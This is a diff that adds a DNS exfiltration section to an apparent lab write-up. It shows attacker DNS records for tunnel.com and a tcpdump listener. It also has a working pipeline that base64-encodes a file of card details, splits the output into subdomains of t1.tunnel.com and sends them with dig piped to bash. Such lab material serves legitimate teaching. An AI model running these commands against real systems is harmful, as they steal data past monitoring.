@@ -177,4 +177,73 @@ The exfiltrated data.
 
 ## DNS
 
-Working...
+DNS (Domain Name System) is a protocol responsible for resolving domain names from ip to name or name to ip. The DNS protocol is often not monitored by the organization, making it possible to exfiltrate data without being easily identified.
+
+For this example we configure the environment as follows;
+
+|Type Record  |  Registered Name          | Registry Value
+|---------    | --------------- |--------------------|
+|A  | t1ns.tunnel.com | 10.1.1.1 (IP Attacker)
+|NS | t1.tunnel.com   | t1ns.tunnel.com
+
+The DNS protocol has some limitations;
+
+* The maximum number of characters allowed in the domain name is 255.
+* The maximum length of a subdomain is 63 characters.
+
+<p align="center">
+  <img width="200" height="90" src="./img/16.jpg">
+</p>
+
+knowing this, there is a limit that we can transfer via DNS. Below we have an example of receiving data via DNS.
+
+<p align="center">
+  <img width="900" height="300" src="./img/17.jpg">
+</p>
+
+1. The attacker registers a domain, **tunnel.com.**
+2. The attacker registers a DNS redirecting traffic to a server that he has control over.
+3. The attacker sends data on the subdomain, the **password** is the data sent.
+4. As this domain does not exist on the local network, the local DNS requests an external DNS.
+5. Is sent to the NS controlled by the attacker, and extracts the subdomain data.
+
+### Starting the attack
+
+To monitor DNS request traffic, we need to open UDP port 53. Let's do this on the **attacker**.
+
+```
+tcpdump -i eth0 udp port 53 -v
+```
+For this example we created the file below on the victim's machine.
+```
+thm@victim2:/tmp/secret$ cat creds.txt 
+Credit Card: 2151-1321-8952-1214
+Expire: 01/01/2026
+Code: 258
+```
+First, let's convert the data in this file to base64, however, remember the character limit? Let's split the base64 to control the DNS limit.
+
+```
+thm@victim2:/tmp/secret$ cat creds.txt |base64 | tr -d "\n" | fold -w18 | sed -r 's/.*/&.t1.tunnel.com/'
+Q3JlZGl0IENhcmQ6ID.t1.tunnel.com
+IxNTEtMTMyMS04OTUy.t1.tunnel.com
+LTEyMTQKRXhwaXJlOi.t1.tunnel.com
+AwMS8wMS8yMDI2CkNv.t1.tunnel.com
+ZGU6IDI1OAo=.t1.tunnel.com
+
+----
+Sent the data
+cat creds.txt |base64 | tr -d "\n" | fold -w18 | sed -r 's/.*/&.t1.tunnel.com/' | awk '{print "dig +short " $1}' | bash
+```
+On our attacking server, we receive the DNS request with base64.
+<p align="center">
+  <img width="900" height="300" src="./img/18.jpg">
+</p>
+
+Reversing the encode.
+```
+thm@victim2:/tmp/secret$ echo 'Q3JlZGl0IENhcmQ6IDIxNTEtMTMyMS04OTUyLTEyMTQKRXhwaXJlOiAwMS8wMS8yMDI2CkNvZGU6IDI1OAo=' | base64 -d
+Credit Card: 2151-1321-8952-1214
+Expire: 01/01/2026
+Code: 258
+```
